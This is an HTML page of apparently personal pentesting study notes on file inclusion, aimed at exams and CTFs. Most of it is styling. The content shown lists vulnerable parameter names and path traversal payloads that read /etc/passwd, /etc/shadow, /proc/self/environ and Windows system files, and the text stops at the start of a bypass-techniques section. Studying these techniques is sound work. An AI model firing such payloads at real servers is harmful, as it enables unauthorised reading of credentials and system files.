@@ -1,0 +1,1648 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2026-07-20 Mon 09:25 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>File Inclusion File Inclusion</title>
+<meta name="author" content="termux" />
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" href="style.css" type="text/css"/>
+<style type='text/css'>
+<!--/*--><![CDATA[/*><!--*/
+/* nice-org-html.css
+;;==============================================================================
+;; Copyright (C) 2024, Ewan Townshend
+
+;; Author: Ewan Townshend
+;; URL: https://github.com/ewantown/nice-org-html
+;; Version: 1.2
+
+;;==============================================================================
+;; This program is free software; you can redistribute it and/or modify
+;; it under the terms of the GNU General Public License as published by
+;; the Free Software Foundation, either version 3 of the License, or
+;; (at your option) any later version.
+
+;; This program is distributed in the hope that it will be useful,
+;; but WITHOUT ANY WARRANTY; without even the implied warranty of
+;; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+;; GNU General Public License for more details.
+
+;; You should have received a copy of the GNU General Public License
+;; along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+;; This file is not part of emacs.
+
+;;==============================================================================
+*/
+
+/* basic layout ***************************************************************/
+*,
+*::before,
+*::after {
+    box-sizing: border-box;
+}
+html {
+    font-family: Sans;
+    line-height: 1.3;
+    font-size: calc(15px + 0.390625vw);
+    -webkit-text-size-adjust: 100%;
+}
+
+body {
+    background: #999; /* overwritten with theme --bg */
+    width: 100%;
+    min-height: 100vh;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    font-family:
+	-apple-system,
+	BlinkMacSystemFont,
+	segoe ui,
+	Roboto,
+	Oxygen,
+	Ubuntu,
+	Cantarell,
+	open sans,
+	helvetica neue,
+	sans-serif,
+	system-ui
+}
+
+#preamble,
+#postamble {
+    width: 100%;
+}
+
+#content {
+    width: 80%;
+    max-width: 80ch;
+    margin-left: 1rem;
+    margin-right: 1rem;
+    flex: 1;
+}
+
+/* custom facing **************************************************************/
+/* The variable values are injected by CSS pre-processing in et-org-html.el */
+:root {
+    --bc-tb: #000000;
+    --bc-block: #595959;
+    --clr: #000000;
+    --clr-tb-hd: #000000;
+    --clr-code: #000000;
+    --bg: #fbf7f0;
+    --bg-code: #cab9b2;
+    --bg-tb-hd: #cab9b2;
+    --bg-block: #efe9dd;
+    --clr-link: #531ab6;
+    --clr-title: #000000;
+    --clr-todo: #00598b;
+    --bg-todo: initial;
+    --clr-done: #7f0000;
+    --bg-done: initial;
+    --ts-clr: #0031a9;
+    --mg: 20px;
+    --w-toc: 300px;
+    --bg-keyword: initial;
+    --clr-keyword: #0031a9;
+    --bg-constant: initial;
+    --clr-constant: #531ab6;
+    --bg-comment: initial;
+    --clr-comment: #7f0000;
+    --bg-comment-delimiter: initial;
+    --clr-comment-delimiter: #7f0000;
+    --bg-function: initial;
+    --clr-function: #602938;
+    --bg-variable: initial;
+    --clr-variable: #00603f;
+    --bg-preprocessor: initial;
+    --clr-preprocessor: #894000;
+    --bg-doc: initial;
+    --clr-doc: #304463;
+    --bg-builtin: initial;
+    --clr-builtin: #721045;
+    --bg-string: initial;
+    --clr-string: #00598b;
+    --clr-note: #0969da;
+    --clr-tip: #1a7f37;
+    --clr-important: #8250df;
+    --clr-warning: #9a6700;
+    --clr-caution: #cf222e;
+}
+
+body[data-mode='light'] {
+    background: var(--bg);
+    color: var(--clr);
+}
+
+body[data-mode='dark'] {
+    background: var(--bg);
+    color: var(--clr);
+    --bc-tb: #ffffff;
+    --bc-block: #989898;
+    --clr: #ffffff;
+    --clr-code: #ffffff;
+    --clr-tb-hd: #ffffff;
+    --bg: #0d0e1c;
+    --bg-tb-hd: #484d67;
+    --bg-code: #484d67;
+    --bg-block: #1d2235;
+    --clr-link: #b6a0ff;
+    --clr-title: #ffffff;
+    --clr-todo: #2fafff;
+    --bg-todo: initial;
+    --clr-done: #ef8386;
+    --bg-done: initial;
+    --ts-clr: #79a8ff;
+    --mg: 20px;
+    --w-toc: 300px;
+    --bg-keyword: initial;
+    --clr-keyword: #79a8ff;
+    --bg-constant: initial;
+    --clr-constant: #b6a0ff;
+    --bg-comment: initial;
+    --clr-comment: #ef8386;
+    --bg-comment-delimiter: initial;
+    --clr-comment-delimiter: #ef8386;
+    --bg-function: initial;
+    --clr-function: #f78fe7;
+    --bg-variable: initial;
+    --clr-variable: #4ae2f0;
+    --bg-preprocessor: initial;
+    --clr-preprocessor: #ff7f86;
+    --bg-doc: initial;
+    --clr-doc: #9ac8e0;
+    --bg-builtin: initial;
+    --clr-builtin: #feacd0;
+    --bg-string: initial;
+    --clr-string: #2fafff;
+    --clr-note: #0969da;
+    --clr-tip: #1a7f37;
+    --clr-important: #8250df;
+    --clr-warning: #9a6700;
+    --clr-caution: #cf222e;
+}
+
+/* exceptions for badly rendering themes **************************************/
+body[data-theme='leuven'],
+body[data-theme='leuven-dark'] {
+    --bg-code: var(--bg-block);
+}
+
+/* ootb page layout ***********************************************************/
+#view-controls {
+    position: sticky;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    top: 0;
+    left: 0;
+    width: 100%;
+    background: var(--bg);
+    color: var(--clr-code);
+    height: 2.5rem;
+    padding-top: 1.25rem;
+    padding-bottom: 1.25rem;
+    z-index: 100;
+    border-radius: 5px; /* Rounded corners */
+}
+#toggle-mode {
+    position: absolute;
+    right: 5%;
+    display: block;
+    text-align: center;
+    font-size: 1.5rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+#goto-top {
+    display: none;
+}
+#goto-top[data-show="true"] {
+    position: relative;
+    display: block;
+    text-align: center;
+    font-size: 1rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+#toggle-toc {
+    display: none;
+}
+#toggle-toc[data-show="true"] {
+    position: absolute;
+    left: 5%;
+    display: block;
+    text-align: center;
+    font-size: 1.5rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+
+#toggle-toc:hover,
+#goto-top:hover,
+#toggle-mode:hover {
+    cursor: pointer;
+}
+
+#table-of-contents {
+    display: none;
+}
+#table-of-contents[data-show="true"] {
+    width: 80%;
+    max-width: 80rem;
+    margin-left: 1rem;
+    margin-right: 1rem;
+    background: var(--bg);
+    scrollbar-width: none;
+    -ms-overflow-style: none;
+}
+
+#table-of-contents::-webkit-scrollbar {
+    display: none;
+}
+
+body[data-toc="true"] #content * {
+    display: none;
+}
+body[data-toc="true"] #content #table-of-contents,
+body[data-toc="true"] #content #table-of-contents * {
+    display: block;
+}
+
+
+/* misc elements **************************************************************/
+
+hr {
+    height: 0;
+    color: inherit;
+}
+
+b,
+strong {
+    font-weight: bolder;
+}
+
+code,
+kbd,
+samp,
+pre {
+    font-family:
+	Menlo,
+	ui-monospace,
+	SFMono-Regular,
+	Consolas,
+	'Liberation Mono',
+	monospace;
+}
+
+small {
+    font-size: 80%;
+}
+
+sub,
+sup {
+    font-size: 75%;
+    line-height: 0;
+    position: relative;
+    vertical-align: baseline;
+}
+
+sub {
+    bottom: -0.25em;
+}
+
+sup {
+    top: -0.5em;
+}
+
+table {
+    text-indent: 0;
+    border-color: inherit;
+}
+
+summary {
+    display: list-item;
+}
+
+h1 {
+    color: var(--clr-title);
+    text-align: center;
+}
+h2 {
+    margin-top: 2rem;
+    margin-bottom: 1rem;
+}
+
+code {
+    color: var(--clr-code);
+    background: var(--bg-code);
+    border-radius: 2px;
+    padding-left: 5px;
+    padding-right: 5px;
+}
+
+pre::-webkit-scrollbar {
+    display: none;
+}
+
+.todo {
+    color: var(--clr-todo);
+    background: var(--bg-todo);
+}
+
+.done {
+    color: var(--clr-done);
+    background: var(--bg-done);
+}
+
+.timestamp-wrapper {
+    font-size: 0.8rem;
+    color: var(--clr-ts);
+}
+
+table {
+    width: 100%;
+    border: 2px solid var(--bc-tb);
+}
+
+thead {
+    color: var(--clr-tb-hd);
+    background: var(--bg-tb-hd);
+}
+
+td, th {
+    border: thin solid var(--bc-tb);
+}
+
+li {
+    margin-top: 0.5rem;
+    margin-bottom: 0.5rem;
+}
+#text-table-of-contents li a:before {
+    content: "• "
+}
+
+a {
+    text-decoration: none;
+    color: var(--clr-link);
+}
+
+a:hover {
+    text-decoration: underline;
+}
+
+.MathJax_Display {
+    font-size: 1.25em;
+}
+
+img {
+    max-width: 100%;
+}
+
+pre {
+    padding: 1rem;
+    border: 1px solid var(--bc-block);
+    border-radius: 0.5rem;
+    background: var(--bg-block);
+    font-size: 0.9rem;
+    overflow-x: auto;
+    -ms-overflow-style: none;
+    scrollbar-width: thin;
+}
+
+.org-src-wrapper {
+    position: relative;
+    border: 1px solid var(--bc-block);
+    border-radius: 0.5rem;
+    background: var(--bg-code);
+}
+
+.org-src-bar {
+    position: relative;
+    top: 0rem;
+    width: 100%;
+    background: var(--bg-code);
+    border-radius: 0.5rem;
+    text-align: right;
+    min-height: 1rem;
+}
+
+.org-src-wrapper .org-src-container {
+    position: relative;
+    border: none;
+    border-radius: 0.5rem;
+    background: var(--bg-code);
+    z-index: 0;
+}
+
+.org-src-wrapper .org-src-container pre.src {
+    border: none !important;
+    background: var(--bg-code) !important;
+    padding-top: 0rem;
+    padding-bottom: 0rem;
+    margin-top: 0rem;
+    margin-bottom: 0rem;
+    padding-bottom: 1.6rem;
+}
+
+.org-src-wrapper .org-src-bar .srcLangLabel {
+    top: 0rem;
+    right: 1.6rem;
+    background-color: transparent;
+    color: var(--clr-doc);
+    border: none;
+    padding: 0.5rem;
+    padding-bottom: 0.3rem;
+    text-align: center;
+    text-decoration: none;
+    font-size: 0.8rem;
+    opacity: 0.5;
+    z-index: 1;
+    display: none;
+}
+
+.org-src-wrapper .org-src-bar .copyBtn {
+    top: 0rem;
+    right: 0.1rem;
+    background-color: transparent;
+    color: var(--clr-doc);
+    border: none;
+    padding: 0.5rem;
+    padding-right: 0.7rem;
+    padding-bottom: 0.3rem;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 0.8rem;
+    cursor: pointer;
+    opacity: 0.5;
+    z-index: 1;
+    transition: opacity 0.3s;
+}
+
+.org-src-wrapper .copyBtn:hover {
+    opacity: 1;
+}
+
+.org-src-wrapper .copyBtn i {
+    margin-right: 0.5rem;
+    padding: 0.5rem;
+}
+
+.admonition {
+    margin: 0.2rem;
+    color: inherit;
+    border-left: .25rem solid;
+}
+.admonition-title {
+    margin: 0 0 0.5rem 0.5rem;
+    padding: 0.5rem 0 0 0;
+    display: flex;
+    align-items: center;
+}
+.admonition-content > p {
+    margin: 0.5rem 0 0 0.5rem;
+    padding: 0 0 0.5rem 0;
+}
+
+.admonition.note {
+    border-left-color: var(--clr-note);
+}
+.admonition-title.note {
+    color: var(--clr-note);
+}
+.admonition-title.note:before {
+    content: '';
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-note);
+    mask-size: cover;    
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path class="admonition-icon-note" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>');    
+}
+.admonition-icon-note {
+    fill: var(--clr-note);
+}
+
+.admonition.tip {
+    border-left-color: var(--clr-tip);
+}
+.admonition-title.tip {
+    color: var(--clr-tip);
+}
+.admonition-title.tip:before {
+    content: '';
+    fill: var(--clr-tip);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-tip);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>');    
+}
+
+.admonition.important {
+    border-left-color: var(--clr-important);
+}
+.admonition-title.important {
+    color: var(--clr-important);
+}
+.admonition-title.important:before {
+    content: '';
+    fill: var(--clr-important);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-important);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v9.5A1.75 1.75 0 0 1 14.25 13H8.06l-2.573 2.573A1.458 1.458 0 0 1 3 14.543V13H1.75A1.75 1.75 0 0 1 0 11.25Zm1.75-.25a.25.25 0 0 0-.25.25v9.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h6.5a.25.25 0 0 0 .25-.25v-9.5a.25.25 0 0 0-.25-.25Zm7 2.25v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 9a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>');    
+}
+
+.admonition.warning {
+    border-left-color: var(--clr-warning);
+}
+.admonition-title.warning {
+    color: var(--clr-warning);
+}
+.admonition-title.warning:before {
+    content: '';
+    color: var(--clr-warning);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-warning);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>');
+}
+
+
+.admonition.caution {
+    border-left-color: var(--clr-caution);
+}
+.admonition-title.caution {
+    color: var(--clr-caution);
+}
+.admonition-title.caution:before {
+    content: '';
+    fill: var(--clr-caution);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-caution);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M4.47.22A.749.749 0 0 1 5 0h6c.199 0 .389.079.53.22l4.25 4.25c.141.14.22.331.22.53v6a.749.749 0 0 1-.22.53l-4.25 4.25A.749.749 0 0 1 11 16H5a.749.749 0 0 1-.53-.22L.22 11.53A.749.749 0 0 1 0 11V5c0-.199.079-.389.22-.53Zm.84 1.28L1.5 5.31v5.38l3.81 3.81h5.38l3.81-3.81V5.31L10.69 1.5ZM8 4a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 8 4Zm0 8a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>');    
+}
+/* responsive layouts *********************************************************/
+
+@media only screen and (max-width: 768px) {
+    #toggle-toc[data-show='true'] {
+	padding-right: 5%;
+    }
+    #toggle-mode {
+	padding-left: 5%;
+    }
+    #content {
+	width: 90%;
+    }
+}
+
+@media only screen and (max-width: 480px) {
+    #view-controls {
+	padding-top: 1.5em;
+	padding-bottom: 1.5em;
+    }
+    #toggle-toc[data-show='true'] {
+	padding-right: 5%;
+    }
+    #toggle-mode {
+	padding-left: 5%;
+    }
+    #content {
+	width: 90%;
+    }
+}
+
+
+/* generated header and footer ************************************************/
+
+#generated-header,
+#generated-footer {
+    width: 90%;
+    margin-left: 5%;
+    margin-right: 5%;
+    line-height: 1;
+}
+.generated header {
+    top: 0;
+    left: 0;
+}
+.generated footer {
+    bottom: 0;
+    left: 0;
+}
+.generated header a,
+.generated footer a {
+    display: inline;
+    color: var(--clr-title);
+    text-decoration: none;
+    transition: color .15s ease-in;
+}
+.generated header a:hover,
+.generated footer a:hover {
+    color: var(--clr-link);
+}
+
+.generated header nav {
+    position: relative;
+    margin-top: 1rem;
+    top: 0;
+    left: 0;
+}
+.generated footer nav {
+    position: relative;
+    bottom: 0;
+    left: 0;
+}
+
+.generated .separator {
+    display: block;
+    width: 111%;
+    margin-left: -5.5%;
+    max-width: 100vw;
+    height: 0.125rem;
+    background: var(--bg-code);
+}
+
+.generated a .nav-title,
+.generated a .nav-author {
+    display: inline;
+    margin-top: 1rem;
+    margin-bottom: 1rem;
+    padding-right: 10rem;
+}
+
+.generated .nav-title {
+    letter-spacing: .075rem;
+    font-weight: 500;
+}
+
+.generated .nav-toggle {
+    display: none;
+}
+.generated .nav-button {
+    display: none;
+}
+.generated .nav-list {
+    overflow-y: hidden;
+    display: block;
+    float: right;
+    list-style: none;
+    margin-bottom: 0;
+    margin-top: 0;
+}
+
+.generated .nav-item {
+    position: relative;
+    float: left;
+    margin: 0;
+}
+.generated .nav-link {
+    position: relative;
+    float: right;
+    margin-left: 2rem;
+    margin-right: 0rem;
+}
+
+.generated .nav-toggle {
+    max-height: 0;
+    visibility: hidden;
+    overflow-y: hidden;
+}
+
+.generated header .separator {
+    margin-top: 1rem;
+    margin-bottom: 0;
+}
+
+.generated footer .separator {
+    margin-bottom: 1rem;
+    margin-top: 0;
+}
+
+.generated .menu-sep {
+    display: none;
+    max-height: 0;
+    overflow-y: hidden;
+    transition: max-height 0.2s ease;
+}
+
+.generated footer {
+    padding-bottom: 1rem;
+}
+
+.generated.compact footer {
+    padding-bottom: 0;
+}
+
+.generated.compact header .separator {
+    margin-top: 0;
+    margin-bottom:0;
+}
+.generated.compact footer .separator {
+    margin-bottom: 1rem;
+}
+
+.generated.compact .nav-toggle {
+    visibility: visible;
+}
+
+.generated.compact .nav-toggle + label span::before {
+    transition: all 0.2s ease-in;
+}
+.generated.compact .nav-toggle:checked + label span::before {
+    transform: translateX(0.04rem) translateY(-0.25rem) rotate(90deg);
+    transition: all 0.2s ease;
+}
+
+.generated.compact .menu-sep {
+    display: flex;
+    max-height: 0rem;
+}
+.generated.compact .nav-toggle:checked + label + .menu-sep {
+    display: block;
+    position: relative;
+    max-height: 1rem;
+    transition: max-height 0.2s ease;
+}
+
+.generated.compact .nav-list {
+    float: none !important;
+    position: relative;
+    display: block;
+    padding-left: 0;
+    padding-right: 0;
+    z-index: 5;
+    width: 100%;
+    height: auto;
+    max-height: 0;
+    margin: 0;
+    overflow-x: hidden;
+    overflow-y: hidden;
+    transition: max-height 0.2s ease;
+}
+.generated.compact .nav-toggle:checked + label ~ .nav-list {
+    display: block;
+    max-height: 100rem;
+    overflow-y: hidden;
+}
+.generated.compact header .nav-toggle:checked + label ~ .nav-list {
+    transition: max-height 0.2s ease;
+}
+
+.generated.compact .nav-button {
+    display: inline;
+    position: relative;
+    float: right;
+    font-size: 1rem;
+}
+.generated.compact .nav-button span::before {
+    display: inline-block;
+    content: '\2807';
+    font-size: 2rem;
+    transform: translateX(0.25rem) translateY(-0.5rem);
+}
+
+.generated.compact .nav-item {
+    float: none !important;
+    text-align: center !important;
+}
+.generated.compact .nav-link {
+    line-height: 2rem;
+    margin-left: 2rem;
+    margin-right: 2rem;
+    float: none !important;
+}
+
+.generated.compact footer .separator.menu-sep {
+    margin-bottom: -1rem;
+}
+
+.hidden {
+    display: none;
+}
+
+.collapsible:hover {
+    cursor: pointer;
+}
+
+.collapsible.collapsed::after {
+    display: inline-block;
+    content: '...';
+}
+/*]]>*/-->
+</style>
+</head>
+<body>
+<div id="preamble" class="status">
+<div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
+</div>
+<div id="content" class="content">
+<h1 class="title">File Inclusion File Inclusion</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orgf9c6d4b">1. Identifying File Inclusion</a></li>
+<li><a href="#orgaa7d0e4">2. Local File Inclusion (LFI)</a>
+<ul>
+<li><a href="#orgc944959">Basic Path Traversal</a></li>
+<li><a href="#orgdb930c6">Bypass Techniques</a></li>
+<li><a href="#orgb16291e">PHP Wrappers</a></li>
+</ul>
+</li>
+<li><a href="#org22ef9fa">3. LFI to RCE</a>
+<ul>
+<li><a href="#orgaa59af8">Log Poisoning — Apache / Nginx</a></li>
+<li><a href="#orgb0007ca">Log Poisoning — SSH Auth Log</a></li>
+<li><a href="#orgf2d09b8">/proc/self/environ</a></li>
+<li><a href="#org14e9e15">PHP Session Poisoning</a></li>
+<li><a href="#org4f16c52">php://input</a></li>
+</ul>
+</li>
+<li><a href="#orgf35a2fb">4. Remote File Inclusion (RFI)</a></li>
+<li><a href="#orga435af8">5. High-Value Files to Read</a>
+<ul>
+<li><a href="#org5c8689e">Linux</a></li>
+<li><a href="#org641dba7">Windows</a></li>
+</ul>
+</li>
+<li><a href="#org060c30d">6. Testing Methodology</a></li>
+<li><a href="#org755866e">7. Reporting Template</a></li>
+<li><a href="#org97b5f05">Tips</a></li>
+</ul>
+</div>
+</div>
+<p>
+A vulnerability where user-controlled input is used to construct
+a file path that the server includes or executes. LFI reads files
+already on the server; RFI fetches and executes files from a
+remote host. LFI is the more common and practical attack surface
+— focus on LFI to RCE chains for exam and CTF contexts.
+</p>
+
+<p>
+Related: <a href="../org/20260206T060721--path-traversal__cybersecurity_technique.html">Path Traversal</a>
+         <a href="../org/20260314T005725--webshell__concept_cybersecurity.html">Webshell</a>
+         <a href="../org/20260206T060726--reverse-shell__concept_cybersecurity.html">Reverse Shell</a>
+         <a href="../org/20260614T002700--file-upload-vulnerabilities__cybersecurity_pentesting_technique.html">File Upload Vulnerabilities</a>
+         <a href="../org/20260207T065427==ssrf--server-side-request-forgery__cybersecurity_technique.html">SSRF</a>
+         <a href="../org/20260611T064753--web-application-testing-methodology__cybersecurity_pentesting_technique.html">Web Application Testing Methodology</a>
+         <a href="../org/20260614T002010--pt1-vulnerability-classification-cheat-sheet__comparison_cybersecurity_pentesting_reference.html">PT1 Vulnerability Classification Cheat Sheet</a>
+</p>
+<div id="outline-container-orgf9c6d4b" class="outline-2">
+<h2 id="orgf9c6d4b">1. Identifying File Inclusion</h2>
+<div class="outline-text-2" id="text-orgf9c6d4b">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_07224d82a7f546a5b7a3c16035b52828>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_07224d82a7f546a5b7a3c16035b52828=document.querySelector('button[name=btn_07224d82a7f546a5b7a3c16035b52828]');
+copyBtnbtn_07224d82a7f546a5b7a3c16035b52828.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Vulnerable parameter patterns\n?page=home\n?file=about\n?template=main\n?lang=en\n?include=header\n?view=index\n?doc=report\n?path=content\n\n# Test with a known file\n?page=../../../../etc/passwd           # Linux\n?page=../../../../windows/win.ini      # Windows\n`);copyBtnbtn_07224d82a7f546a5b7a3c16035b52828.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_07224d82a7f546a5b7a3c16035b52828.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-text"># Vulnerable parameter patterns
+?page=home
+?file=about
+?template=main
+?lang=en
+?include=header
+?view=index
+?doc=report
+?path=content
+
+# Test with a known file
+?page=../../../../etc/passwd           # Linux
+?page=../../../../windows/win.ini      # Windows
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgaa7d0e4" class="outline-2">
+<h2 id="orgaa7d0e4">2. Local File Inclusion (LFI)</h2>
+<div class="outline-text-2" id="text-orgaa7d0e4">
+</div>
+<div id="outline-container-orgc944959" class="outline-3">
+<h3 id="orgc944959">Basic Path Traversal</h3>
+<div class="outline-text-3" id="text-orgc944959">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_765057fe97624a9c8ac5e4ed6e124ab7>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_765057fe97624a9c8ac5e4ed6e124ab7=document.querySelector('button[name=btn_765057fe97624a9c8ac5e4ed6e124ab7]');
+copyBtnbtn_765057fe97624a9c8ac5e4ed6e124ab7.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Linux targets — confirm LFI\n?file=../../../../etc/passwd\n?file=../../../../etc/shadow           # requires root\n?file=../../../../etc/hosts\n?file=../../../../proc/version         # kernel version\n?file=../../../../proc/self/environ    # environment variables\n\n# Windows targets\n?file=../../../../windows/win.ini\n?file=../../../../windows/system32\\drivers\\etc\\hosts\n?file=../../../../boot.ini             # older systems\n`);copyBtnbtn_765057fe97624a9c8ac5e4ed6e124ab7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_765057fe97624a9c8ac5e4ed6e124ab7.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Linux targets &#8212; confirm LFI
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../etc/passwd
+?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../etc/shadow           <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">requires root
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../etc/hosts
+?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../proc/version         <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">kernel version
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../proc/self/environ    <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">environment variables
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Windows targets
+</span>?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../windows/win.ini
+?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../windows/system32\drivers\etc\hosts
+?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">file</span>=../../../../boot.ini             <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">older systems</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgdb930c6" class="outline-3">
+<h3 id="orgdb930c6">Bypass Techniques</h3>
+<div class="outline-text-3" id="text-orgdb930c6">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_bf0bab7c59fe4246a94d8f3c589bf08c>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_bf0bab7c59fe4246a94d8f3c589bf08c=document.querySelector('button[name=btn_bf0bab7c59fe4246a94d8f3c589bf08c]');
+copyBtnbtn_bf0bab7c59fe4246a94d8f3c589bf08c.addEventListener('click', function(event) {
